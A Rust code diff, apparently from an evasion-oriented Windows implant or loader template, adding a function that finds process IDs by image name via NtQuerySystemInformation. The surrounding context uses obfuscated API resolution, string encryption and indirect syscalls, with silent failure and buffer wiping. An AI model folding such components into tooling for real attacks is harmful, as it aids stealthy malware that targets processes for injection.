@@ -54,3 +54,99 @@ pub unsafe fn resolve_nt_api_address(obfuscated_name: &[u8], key: u8) -> *const 
 pub unsafe fn resolve_kernel32_api_address(obfuscated_name: &[u8], key: u8) -> *const () {
     resolve_api_address(&lc!("kernel32"), obfuscated_name, key)
 }
+
+pub const SYSTEM_PROCESS_INFORMATION_CLASS: u32 = 5;
+const STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC0000004u32 as i32;
+const QUERY_BUFFER_SIZE: usize = 1024 * 1024;
+const MAX_QUERY_ATTEMPTS: usize = 8;
+
+#[repr(C)]
+struct UnicodeString {
+    length: u16,
+    _maximum_length: u16,
+    _padding: u32,
+    buffer: *const u16,
+}
+
+// Fixed prefix of SYSTEM_PROCESS_INFORMATION (x64 layout). Records are
+// variable-length and walked through next_entry_offset, never through
+// size_of::<ProcessInformationEntry>().
+#[repr(C)]
+struct ProcessInformationEntry {
+    next_entry_offset: u32,
+    _number_of_threads: u32,
+    _working_set_private_size: u64,
+    _hard_fault_count: u32,
+    _number_of_threads_high_watermark: u32,
+    _cycle_time: u64,
+    _create_time: i64,
+    _user_time: i64,
+    _kernel_time: i64,
+    image_name: UnicodeString,
+    _base_priority: u32,
+    _padding: u32,
+    unique_process_id: usize,
+}
+
+/// Collect the PIDs of every process whose image name matches `tar`
+/// (case-insensitive) by walking the SYSTEM_PROCESS_INFORMATION list
+/// returned by NtQuerySystemInformation.
+///
+/// `query` performs the actual NtQuerySystemInformation call at the
+/// template's own abstraction level (static import, indirect syscall or
+/// dynamically resolved NT API) and returns the raw NTSTATUS. Failing
+/// queries yield an empty list, following the silent-failure convention.
+pub fn find_process_ids_by_name<F>(tar: &str, mut query: F) -> Vec<usize>
+where
+    F: FnMut(*mut u8, usize) -> i32,
+{
+    let tar_lower = tar.to_lowercase();
+    let mut pids: Vec<usize> = Vec::new();
+    let mut buffer: Vec<u8> = Vec::with_capacity(QUERY_BUFFER_SIZE);
+    let mut capacity = QUERY_BUFFER_SIZE;
+
+    for _ in 0..MAX_QUERY_ATTEMPTS {
+        buffer.resize(capacity, 0);
+        let status = query(buffer.as_mut_ptr(), buffer.len());
+        if status >= 0 {
+            unsafe { collect_matching_pids(&buffer, &tar_lower, &mut pids) };
+            wipe(&mut buffer);
+            return pids;
+        }
+        if status != STATUS_INFO_LENGTH_MISMATCH {
+            break;
+        }
+        capacity = capacity.saturating_mul(2);
+    }
+
+    wipe(&mut buffer);
+    pids
+}
+
+unsafe fn collect_matching_pids(buffer: &[u8], tar_lower: &str, pids: &mut Vec<usize>) {
+    let mut offset = 0usize;
+    loop {
+        let entry = &*(buffer.as_ptr().add(offset) as *const ProcessInformationEntry);
+        if image_name_matches(entry, tar_lower) {
+            pids.push(entry.unique_process_id);
+        }
+        if entry.next_entry_offset == 0 {
+            return;
+        }
+        offset += entry.next_entry_offset as usize;
+        if offset >= buffer.len() {
+            return;
+        }
+    }
+}
+
+// The System Idle Process carries a NULL ImageName buffer, so a missing
+// name simply never matches the target.
+unsafe fn image_name_matches(entry: &ProcessInformationEntry, tar_lower: &str) -> bool {
+    let name = &entry.image_name;
+    if name.buffer.is_null() || name.length == 0 {
+        return false;
+    }
+    let chars = std::slice::from_raw_parts(name.buffer, name.length as usize / 2);
+    String::from_utf16_lossy(chars).to_lowercase() == tar_lower
+}
